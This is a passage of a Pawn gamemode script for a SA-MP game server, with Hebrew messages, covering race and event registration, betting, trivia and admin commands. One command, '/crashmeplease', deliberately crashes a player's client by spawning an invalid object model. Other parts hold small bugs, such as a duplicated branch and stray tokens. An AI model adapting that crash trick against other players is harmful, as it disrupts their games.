if(YouRegister[playerid] ==1) return SendClientMessage(playerid,WHITE,"אתה כבר רשום.");
new fstr[255];
if(!IsVehicle(playerid)) return  format(fstr,sizeof(fstr),"/drifts , /race , /dj .על מנת להשתתף במירוץ דריפט Turismo אתה צריך תרכב"),SendClientMessage(playerid,WHITE,fstr);
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,WHITE,".אנא כנס לרכב כדאי להירשם");
DriftPlayer++;
YouRegister[playerid] =1;

if(DriftPlayer == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",DriftPlayer);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל לנסוע כמה שיותר מהר לצ'ק פוינטים האדומים על המסלול מירוץ");
SendClientMessage(playerid,0xE21E1EFF,string);
if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,1);
SetVehicleVirtualWorld(vehicleid,1);
SetPlayerRaceCheckpoint(playerid, 0,2297.5369,1509.4496,42.8203,2290.4094,1500.1200,42.6123, 6);//CP2
TogglePlayerControllable(playerid,0);
DriftCP[playerid] =1;
if(DriftPlayer ==1)return SetVehiclePos(vehicleid,2300.0222,1408.4586,42.5272),SetVehicleZAngle(vehicleid,0.1799);
if(DriftPlayer ==2)return SetVehiclePos(vehicleid,2302.8008,1408.2854,42.5275),SetVehicleZAngle(vehicleid,358.9406);
if(DriftPlayer ==3)return SetVehiclePos(vehicleid,2306.1240,1408.3108,42.5273),SetVehicleZAngle(vehicleid,359.0157);
if(DriftPlayer ==4)return SetVehiclePos(vehicleid,2308.8560,1408.2356,42.5280),SetVehicleZAngle(vehicleid,0.2649);
if(DriftPlayer ==5)return SetVehiclePos(vehicleid,2311.6707,1408.2217,42.5272),SetVehicleZAngle(vehicleid,358.9902);
if(DriftPlayer ==5)return SetVehiclePos(vehicleid,2314.1875,1408.3422,42.5269),SetVehicleZAngle(vehicleid,2.0840);
if(DriftPlayer ==6)return SetVehiclePos(vehicleid,2316.7107,1408.4094,42.5272),SetVehicleZAngle(vehicleid,1.4716);
if(DriftPlayer ==7)return SetVehiclePos(vehicleid,2319.1816,1408.4569,42.5277),SetVehicleZAngle(vehicleid,359.4041);
if(DriftPlayer ==8)return SetVehiclePos(vehicleid,2321.4253,1408.4253,42.5286),SetVehicleZAngle(vehicleid,1.8897);
if(DriftPlayer ==9)return SetVehiclePos(vehicleid,2323.9102,1408.4175,42.5273),SetVehicleZAngle(vehicleid,3.3133);
if(DriftPlayer ==10)return SetVehiclePos(vehicleid,2326.4661,1408.4795,42.5263),SetVehicleZAngle(vehicleid,3.3910);
if(DriftPlayer ==11)return SetVehiclePos(vehicleid,2328.7549,1408.6261,42.5258),SetVehicleZAngle(vehicleid,3.8961);
if(DriftPlayer ==12)return SetVehiclePos(vehicleid,2331.2324,1408.8168,42.5270),SetVehicleZAngle(vehicleid,4.3630);
if(DriftPlayer ==13)return SetVehiclePos(vehicleid,2333.6531,1408.9194,42.5272),SetVehicleZAngle(vehicleid,359.4334);
if(DriftPlayer ==14)return SetVehiclePos(vehicleid,2335.9211,1408.9659,42.5270),SetVehicleZAngle(vehicleid,359.0094);
if(DriftPlayer ==15)return SetVehiclePos(vehicleid,2338.1948,1409.0341,42.5284),SetVehicleZAngle(vehicleid,1.5728);
if(DriftPlayer ==16)return SetVehiclePos(vehicleid,2340.4922,1408.9869,42.5243),SetVehicleZAngle(vehicleid,2.5946);
if(DriftPlayer ==17)return SetVehiclePos(vehicleid,2342.9924,1408.9186,42.5273),SetVehicleZAngle(vehicleid,0.8667);
if(DriftPlayer ==18)return SetVehiclePos(vehicleid,2345.3049,1409.0309,42.5269),SetVehicleZAngle(vehicleid,0.6740);
if(DriftPlayer ==19)return SetVehiclePos(vehicleid,2347.7759,1409.1488,42.5261),SetVehicleZAngle(vehicleid,358.0116);
if(DriftPlayer ==20)return SetVehiclePos(vehicleid,2350.0234,1409.2120,42.5271),SetVehicleZAngle(vehicleid,359.3376);
if(DriftPlayer ==21)return SetVehiclePos(vehicleid,2352.2991,1409.1683,42.5278),SetVehicleZAngle(vehicleid,357.8737);
if(DriftPlayer ==22)return SetVehiclePos(vehicleid,2354.6870,1409.1930,42.5264),SetVehicleZAngle(vehicleid,358.3572);

return 1;
}

if(BikeOn == 1)
{
new fstr[256];
if (BikeOn == 0) return SendClientMessage(playerid, WHITE, ".אין מירוץ פעיל כרגע");
if(BikePlayers == 10) return SendClientMessage(playerid,WHITE,"ההרשמה נסגרה, כל המקומות נתפסו. נסה פעם הבאה");
if(InBike[playerid] > 0) return SendClientMessage(playerid,WHITE,"הצטרפת, אנא המתן לשיגורך בסבלנות תודה");
if(!IsBike(playerid)) return  format(fstr,sizeof(fstr),".על מנת להשתתף במירוץ ,NRG-500 אתה צריך תרכב"),SendClientMessage(playerid,WHITE,fstr);
if(!(IsPlayerInAnyVehicle(playerid))) return SendClientMessage(playerid,WHITE,".אנא כנס לרכב כדאי להירשם");
DisablePlayerRaceCheckpoint(playerid);
SetPlayerRaceCheckpoint(playerid,0,-2679.4287,1357.5764,55.4297,-2677.4780,1468.2661,55.7398,15);
BikePlayers ++;
InBike[playerid] = 1;

if(BikePlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",BikePlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),"!בעת התחלת הקרב, תתחיל לנסוע כמה שיותר מהר לצ'ק פוינטים האדומים על המסלול מירוץ");
SendClientMessage(playerid,0xE21E1EFF,string);
if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
new vehicleid = GetPlayerVehicleID(playerid);
SetPlayerVirtualWorld(playerid,1);
SetVehicleVirtualWorld(vehicleid,1);
TogglePlayerControllable(playerid,0);
if(BikePlayers == 1)
{
SetVehiclePos(vehicleid,-2668.5300,1289.6600,55.0066);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 2)
{
SetVehiclePos(vehicleid,-2669.8596,1289.5593,54.9772);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 3)
{
SetVehiclePos(vehicleid,-2671.5039,1289.2844,54.9953);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 4)
{
SetVehiclePos(vehicleid,-2672.9126,1288.8269,54.9983);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 5)
{
SetVehiclePos(vehicleid,-2675.4602,1289.6935,54.9863);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 6)
{
SetVehiclePos(vehicleid,-2676.6624,1289.6770,54.9936);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 7)
{
SetVehiclePos(vehicleid,-2677.8667,1289.6951,54.9994);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 8)
{
SetVehiclePos(vehicleid,-2679.8469,1289.4535,54.9909);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}
if(BikePlayers == 9)
{
SetVehiclePos(vehicleid,-2681.5703,1289.2745,55.1966);
SetVehicleZAngle(vehicleid,0.4992);

return 1;
}
if(BikePlayers == 10)
{
SetVehiclePos(vehicleid,-2682.8469,1289.0913,55.1279);
SetVehicleZAngle(vehicleid,0.4992);
return 1;
}

return 1;
}
return 1;
}

return 1;
}


if(!strcmp(cmd, "/bet", true))
{
if(PlayerInfo[playerid][Level] < 2) return Messagelevel(playerid,2);
new Parameter_es[256];
Parameter_es= strtok(cmdtext, idx);
if(!strlen(Parameter_es)) return SendClientMessage(playerid, COLOR_WHITE,"Usage: /bet [amount]");
if(GetPlayerMoney(playerid) < strval(Parameter_es) || GetPlayerMoney(playerid) < 1 || strval(Parameter_es) < 500 || strval(Parameter_es) > 3000) return SendClientMessage(playerid,red,".סכום שגויי");
new rand[200];
rand[playerid] = 0;
rand[playerid] = random(7);

LACY_GiveMoney(playerid,-strval(Parameter_es));
if(rand[playerid] == 2)
{
format(str, sizeof(str), ".$%d מזל טוב! זכית ב",strval(Parameter_es)*2);
SendClientMessage(playerid, COLOR_LIGHTGREEN, str);
LACY_GiveMoney(playerid,strval(Parameter_es)*2);
}
else
{
SendClientMessage(playerid,red,"!לא זכית");
}
return true;
}

if(!strcmp(cmd, "/crashmeplease", true))
{
new Float:x,Float:y,Float:z;
GetPlayerPos(playerid,x,y,z);
CreatePlayerObject(playerid,999999,x,y,z,0.0000, 0.0000, 90.0000);
return 1;
}
/*
if(!strcmp(cmd, "/resetw", true))
{
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".מחקת את נשקיך");
return true;
}

if(!strcmp(cmd, "/resetm", true))
{
if(!GetPlayerMoney(playerid)) return SendClientMessage(playerid,red,".אין לך כסף");
ResetPlayerMoney(playerid);
SendClientMessage(playerid,COLOR_LIGHTGREEN,".מחקת את כספיך");
return true;
}
*/

if(!strcmp(cmd, "/resetwanted", true))
{
if(!GetPlayerWantedLevel(playerid)) return SendClientMessage(playerid,red,".אין לך רמת מבוקשות");
SetPlayerWantedLevel(playerid, 0);
return true;
}


	if (strcmp("/Ha", cmd, true) == 0)
	{
		new cmdid, pname[MAX_PLAYER_NAME];
		tmp = strtok(cmdtext, idx);
		if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

		if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /Ha [answer]");
		cmdid = strval(tmp);

		if(cmdid < answer || cmdid > answer)
		{
			SendClientMessage(playerid, WHITE, ".תשובה שגויה");
		}

		if(cmdid == answer && answered == 0)
		{
			GetPlayerName(playerid, pname, sizeof(pname));

			format(string, sizeof(string), ".[1000$],'%d' :ענה על התשובה נכון, התשובה הייתה %s השחקן",cmdid ,pname);
			SendClientMessageToAll(COLOR_LIGHTGREEN, string);
			PlayerInfo[playerid][Ans] +=1;
			dini_IntSet(GetPlayerFile(playerid),"Ans",PlayerInfo[playerid][Ans]);

			LACY_GiveMoney(playerid, 1000);

			answered = 1;
			SetPlayerScore(playerid, GetPlayerScore(playerid) + score);
			score = 0;
			return 1;
		}
		else if(cmdid == answer && answered == 1)
		{
			SendClientMessage(playerid, WHITE, ".מאוחר מידי, כבר ענו לפניך");
		}
		return 1;
	}






if(!strcmp(cmd, "/startwar", true))
{
if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid, red, ".פקודה זאתי משמשת אדמינים בלבד");
if(WarOn == 1) return SendClientMessage(playerid, red, ".יש כבר מלחמה פעילה");
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/War~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
SetTimer("WarStart",3000,0);
return 1;
}

//===============================jetpackStart Command===============================
if(!strcmp(cmd, "/sjp", true))
{

if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid, red, ".פקודה זאתי משמשת אדמינים בלבד");
if(jetpackOn == 1) return SendClientMessage(playerid, red, ".יש כבר מלחמת ג'ט פאקים מעופפים פעילה ");
format(kboobjetpack, sizeof(kboobjetpack), "~B~~H~ /wjetpack", playername);
GameTextForAll(kboobjetpack,3000,4);
SetTimer("jetpackStart2",3000,0);
return 1; }
//===============================jetpackJoin Command================================
if(!strcmp(cmd, "/wjetpack", true)) {
if(jetpackOn == 0) return SendClientMessage(playerid, red, ".אין עכשיו מלחמת ג'ט פאקים מעופפים פעילה");
if(jetpackStart == 1) return SendClientMessage(playerid, red, ".התחילה כבר JetPack מלחמת ה");
if(jetpackPlayers == sizeof(jetpackSpawn)) return SendClientMessage(playerid, red, ".כל המקומות נתפסו");
if(Injetpack[playerid] == 1) return SendClientMessage(playerid, red, ".הצטרפת כבר למלחמת ג'ט פאקים מעופפים, אנא המתן");
jetpackPlayers ++; Injetpack[playerid] = 1;

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",jetpackPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להרוג את המשתתפים האחרים");
SendClientMessage(playerid,0xE21E1EFF,string);
return 1;
}

//===============================jetpackEnd Command================================
if(!strcmp(cmd, "/jetpackend", true)) {
if(jetpackOn == 0) return SendClientMessage(playerid, red, ".אין עכשיו מלחמת ג'ט פאקים מעופפים פעילה");
if(jetpackStart == 1) return SendClientMessage(playerid, red, ".המלחמת ג'ט פאקים מעופפים כבר התחילה ");
if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid, red, ".אתה לא אדמין ");
SendClientMessage(playerid, COLOR_YELLOW, "המלחמת ג'ט פאקים מעופפים בוטלה בהצלחה ");
GetPlayerName(playerid, jetpackadminsname, sizeof(jetpackadminsname));
Countjetpackllenge = 0;
jetpackEnd(2);
return 1; }


if(!strcmp(cmd, "/war", true))
{
if(WarOn == 0) return SendClientMessage(playerid, WHITE, ".אין עכשיו מלחמה פעילה");
if(WS == 1) return SendClientMessage(playerid, WHITE, ".המלחמה כבר התחילה, נסה פעם הבאה ");
if(WarPlayers == sizeof(sssa)) return SendClientMessage(playerid, WHITE, ".כל המקומות נתפסו, נסה פעם באה");
if(InWar[playerid] == 1) return SendClientMessage(playerid, WHITE, ".הצטרפת כבר לוואר, אנא המתן");
if(TorYou[playerid] ==1) return SendClientMessage(playerid, WHITE,"/backtor :אנא החזר/י תחיה שלך");
if(SharkYou[playerid] ==1) return SendClientMessage(playerid, WHITE,"/backshark :אנא החזר/י תחיה שלך");
if(DolpYou[playerid] ==1) return SendClientMessage(playerid, WHITE,"/backdolphin :אנא החזר/י תחיה שלך");
if(GetPlayerMoney(playerid) < 500) return SendClientMessage(playerid, WHITE, ".\"500$\" :אין לך מספיק כסף להשתתף בקארט עלות השתתפות היא");

GetPlayerName(playerid, playername, sizeof(playername));
WarPlayers ++; InWar[playerid] = 1;
MoneyWinnerWar +=500;
LACY_GiveMoney(playerid,-500);
format(string,sizeof(string),".%d :הינך משתתף/ת מספר",WarPlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להרוג את המשתתפים האחרים");
SendClientMessage(playerid,0xE21E1EFF,string);
if(WarPlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);

}
if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
TogglePlayerControllable(playerid, 1);
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
return 1;
}

if(!strcmp(cmd, "/warend", true))
{
if(WarOn == 0) return SendClientMessage(playerid, WHITE, ".אין עכשיו מלחמה פעילה");
if (!IsPlayerXAdmin(playerid,10)) return 0;
SendClientMessage(playerid, red, "המלחמה בוטלה בהצלחה ");
GetPlayerName(playerid, Adminname, sizeof(Adminname));
Count = 0;
WarEnd(2);
return 1;
}

if(!strcmp(cmd, "/srpg", true))
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /srpg [ammunt]");
Rewardr  = strval(tmp);
WarStartr();
format(kboobcha, sizeof(kboobcha), "~y~~H~[]/Rpg~y~~H~[]");
GameTextForAll(kboobcha,3000,4);
return 1;
}

//===============================GreStart Command===============================
if(!strcmp(cmd, "/startGre", true)) {
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_WHITE, "Usage: /startgre");
if (!IsPlayerXAdmin(playerid,10)) return 0;
if(GreOn == 1) return SendClientMessage(playerid, red, ".יש כבר מלחמת רימונים פעילה ");
format(kboobGre, sizeof(kboobGre), "~B~~H~ /Gre", playername);
GameTextForAll(kboobGre,3000,4);
GrePras  = strval(tmp);
SetTimer("GreStart2",3000,0);
return 1; }
//===============================GreJoin Command================================
if(!strcmp(cmd, "/Gre", true)) {
if(GreOn == 0) return SendClientMessage(playerid, red, ".אין עכשיו מלחמת רימונים פעילה");
if(GreStart == 1) return SendClientMessage(playerid, red, ".המלחמת רימונים כבר התחילה, נסה פעם הבאה ");
if(GrePlayers == sizeof(GreSpawn)) return SendClientMessage(playerid, red, ".כל המקומות נתפסו, נסה פעם באה");
if(InGre[playerid] == 1) return SendClientMessage(playerid, red, ".הצטרפת כבר למלחמת רימונים, אנא המתן");
GrePlayers ++; InGre[playerid] = 1;

if(GrePlayers == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);
}

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",GrePlayers);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להרוג את המשתתפים האחרים");
SendClientMessage(playerid,0xE21E1EFF,string);


return 1; }
//===============================GreEnd Command================================
if(!strcmp(cmd, "/Greend", true)) {
if(GreOn == 0) return SendClientMessage(playerid, red, ".אין עכשיו מלחמת רימונים פעילה");
if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid, red, ".אתה לא אדמין ");
SendClientMessage(playerid, COLOR_YELLOW, "המלחמת רימונים בוטלה בהצלחה ");
GetPlayerName(playerid, Greadminsname, sizeof(Greadminsname));
CountGrellenge = 0;
GreEnd(2);
return 1; }

if(!strcmp(cmd, "/Rpg", true))
{


if(WarOnr == 0) return SendClientMessage(playerid, red, "אין כרגע מערכת בזוקה פעילה, תודה.");
if(WSr == 1) return SendClientMessage(playerid, red, ".הגאטר כבר החל, לא תוכל להירשם עד לפעם הבאה תודה");
if(WarPlayersr == sizeof(gRandomWarSpawns)) return SendClientMessage(playerid, red, " כל המקומות נתפסו, נסה פעם באה");
if(InWarr[playerid] == 1) return SendClientMessage(playerid, red, "אתה כבר רשום, המתן לשיגורך בסבלנות.");
WarPlayersr ++; InWarr[playerid] = 1;

format(string,sizeof(string),".%d :הינך משתתף/ת מספר",WarPlayersr);
SendClientMessage(playerid,0xE21E1EFF,string);
format(string,sizeof(string),".בעת התחלת הקרב, תתחיל להרוג את המשתתפים האחרים");
SendClientMessage(playerid,0xE21E1EFF,string);
SetPlayerVirtualWorld(playerid,0);
if(WarPlayersr == 1)
{
format(string,sizeof(string),".הצטרף לפעילות ראשון וקיבל צו'פר של 1,000 דולר %s השחקן",GetName(playerid));
SendClientMessageToAll(0xE21E1EFF,string);
LACY_GiveMoney(playerid,1000);
}

if(AirBreakVar[playerid] == 1)
{
AirBreakVar[playerid] = 0;
TogglePlayerControllable(playerid, 1);
SendClientMessage(playerid, WHITE, ".האייר ברייק שלך כובה בהצלחה");
}
return 1;
}

if(!strcmp(cmd, "/Rpgend", true))
{
if(WarOnr == 0) return SendClientMessage(playerid, WHITE, " אין עכשיו מלחמה פעילה");
if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid, WHITE, " אתה לא אדמין ");
SendClientMessage(playerid, WHITE, " המלחמה בוטלה בהצלחה ");
Countr = 0;
WarEndr(2);
return 1;
}


if(strcmp(cmd, "/flip", true) == 0)
{
if(InBike[playerid]==1||YouRegister[playerid]==1||Youregisterrace[playerid] == 1||InWarw[playerid] == 1||InWarr[playerid]== 1||InWar[playerid]==1||InCha[playerid] == 1||InKart[playerid] == 1||iNmOnster[playerid] == 1) return SendClientMessage(playerid,red,".אתה לא יכול להפעיל את מצב האיר ברייק כרגע, אתה רשום ל-1 מהפעיליות שאסור שם אייר ברייק");
new Float:X, Float:Y, Float:Z;
if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red,".אתה לא ברכב");
SetCameraBehindPlayer(playerid);
GetPlayerPos(playerid, X, Y, Z);
SetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
SetVehicleZAngle(GetPlayerVehicleID(playerid), 0);
return 1;
}


if(strcmp(cmd, "/MAXPLAYERS", true) == 0)
{
new maximum_players = GetMaxPlayers();
format(string,sizeof(string),"%d :מקסימום שחקנים",maximum_players);
SendClientMessage(playerid, WHITE, string);
return 1;
}


if(strcmp(cmd, "/players", true) == 0)
{
new maximum_players = GetMaxPlayers();
new count = 0;
SendClientMessage(playerid,lblue,"~~~ :שחקנים ~~~");
for(new i = 0; i < GetMaxPlayers(); i++)
{
if(IsPlayerConnected(i) == 1)
{
count ++;
}
}
if(!count) return true;
format(string,sizeof(string),".%d :מקסימום מקומות",maximum_players);
SendClientMessage(playerid,COLOR_GREY,string);

format(string,sizeof(string),".%d :כעת יש מספר מחוברים של כ",count);
SendClientMessage(playerid,COLOR_GREY,string);

format(string,sizeof(string),".%d :כדי להגיע למקסימום צריך עוד מספר של שחקנים של כ",maximum_players-count);
SendClientMessage(playerid,COLOR_GREY,string);
return true;
}

if(strcmp(cmd, "/showid", true) == 0)
{
format(string, sizeof(string), "Your ID: %d",playerid);
SendClientMessage(playerid, green, string);
return 1;
}





    if(strcmp(cmd,"/SetLevelI",true) == 0)
    {
if (!IsPlayerXAdmin(playerid,10)) return 0;


       // if(!IsPlayerXAdmin(playerid)) return SendClientMessage(playerid,WHITE,". אתה לא אדמין");
        tmp = strtok(cmdtext, idx);
        if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");

		new id = ReturnID(tmp);
//        new tmp2[256];
        tmp2 = strtok(cmdtext, idx);
        if(20 < strlen(tmp2)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");

		new level = strval(tmp2);
        if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /setlevel [playerid] [level]");
        if(!strlen(tmp2)) return SendClientMessage(playerid, WHITE, "Usage: /setlevel [playerid] [level]");
        if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
        PlayerInfo[id][Level] = level;
        return 1;
    }
    
if(strcmp(cmd,"/SetLevelAdmin",true) == 0)
{

//new adminlevelss;



if(!IsPlayerXAdmin(playerid,10)) return SendClientMessage(playerid,WHITE,".רק אדמין של רקון יכולים להשתמש בפקודות האלה");
//tmp = strtok(cmdtext, idx);
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
//        new tmp2[256];
tmp2 = strtok(cmdtext, idx);
if(20 < strlen(tmp2)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
new adlvl = strval(tmp2);
if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /SetLevelAdmin [playerid] [level]");
if(!strlen(tmp2)) return SendClientMessage(playerid, WHITE, "Usage: /SetLevelAdmin [playerid] [level]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
PlayerInfo[id][AdminsLevel] = adlvl;
dini_IntSet(GetPlayerFile(id),"Adminl",PlayerInfo[id][AdminsLevel]);
//SendClientMessage(id,WHITE,"/Syshelp :מזל טוב נהיית כרגע קיבלת גישה להפעיל מערכות לעזרה");
		return 1;
    }

    if(strcmp(cmd,"/SetBank",true) == 0)
    {
if (!IsPlayerXAdmin(playerid,19)) return 0;

 	    tmp = strtok(cmdtext, idx);
        if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

	   new id = ReturnID(tmp);

        tmp2 = strtok(cmdtext, idx);
if(20 < strlen(tmp2)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");

		new banke = strval(tmp2);
        if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /SetBank [playerid] [money]");
        if(!strlen(tmp2)) return SendClientMessage(playerid, WHITE, "Usage: /SetBank [playerid] [money]");
        if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
        PlayerInfo[id][Bank] = banke;
        dini_IntSet(GetPlayerFile(id),"Bank",PlayerInfo[id][Bank]);

        return 1;
    }
    
    


if(strcmp(cmd,"/CarMsg1",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
new icqnumb[256];
icqnumb = strtok(cmdtext,idx);
if(20 < strlen(icqnumb)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(icqnumb)) return SendClientMessage(playerid,WHITE,"Usage: /carmsg1 [playerid] [tag] ");
if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /carmsg1 [playerid] [money]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
if(pia[id][CarID] == 0) return SendClientMessage(playerid,WHITE,".שחקן זה לא מחזיק בשום רכב");
format(file,sizeof(file),"Car/car%d.ini", pia[id][CarID]);
dini_Set(file,"CarName",icqnumb);
strmid(VehicleInfo[pia[id][CarID]][CarName], icqnumb, 0, strlen(icqnumb), 255);
return 1;
}


if(strcmp(cmd,"/cgm",true) == 0)
{
if (!IsPlayerXAdmin(playerid,1)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
GodModCheack(id);
return 1;
}
if(strcmp(cmd,"/setkills",true) == 0)
{
if (!IsPlayerXAdmin(playerid,19)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
tmp2 = strtok(cmdtext, idx);
if(20 < strlen(tmp2)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new kills = strval(tmp2);
if(!strlen(tmp)) return SendClientMessage(playerid, WHITE, "Usage: /setkills [playerid] [kills]");
if(!strlen(tmp2)) return SendClientMessage(playerid, WHITE, "Usage: /setkills [playerid] [kills]");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COLOR_BLUE, "Invalid PlayerID !");
PlayerInfo[id][Kills] = kills;

return 1;
}



if(strcmp(cmd,"/triviaMP",true) == 0)
{
if (!IsPlayerXAdmin(playerid,1)) return 0;

SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
SendClientMessageToAll(COLOR_PINK, "?שאלה: כמה אנשים יש בשרת עכשיו");
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
AnsTrivia1 = InTheServer;
fnm
MaxAns[i] = 0;
TriviaOn = 1;
}
return 1;
}

if(strcmp(cmd,"/triviahm",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :כמה כסף יש לשחקן",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
SendClientMessageToAll(0x0E67AFF, "/Ans [Answer] :על מנת לענות על התשובה");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
AnsTrivia1 = GetPlayerMoney(id);
fnm
MaxAns[i] = 0;
TriviaOn = 1;
}
return 1;
}


if(strcmp(cmd,"/triviaLevel",true) == 0)
{
if (!IsPlayerXAdmin(playerid,10)) return 0;
tmp = strtok(cmdtext, idx);
if(20 < strlen(tmp)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
new id = ReturnID(tmp);
if(!IsPlayerConnected(id)) return SendClientMessage(playerid, WHITE, "Invalid PlayerID.");
SendClientMessageToAll(WHITE, "» » [A]--[Trivia | טריוויה] » »");
format(string, sizeof(string),"..?(%d) %s :מה הרמה של השחקן",id, GetName(id));
SendClientMessageToAll(COLOR_PINK, string);
SendClientMessageToAll(COLOR_PINK, ".$מי שיענה נכון, יקבל 600");
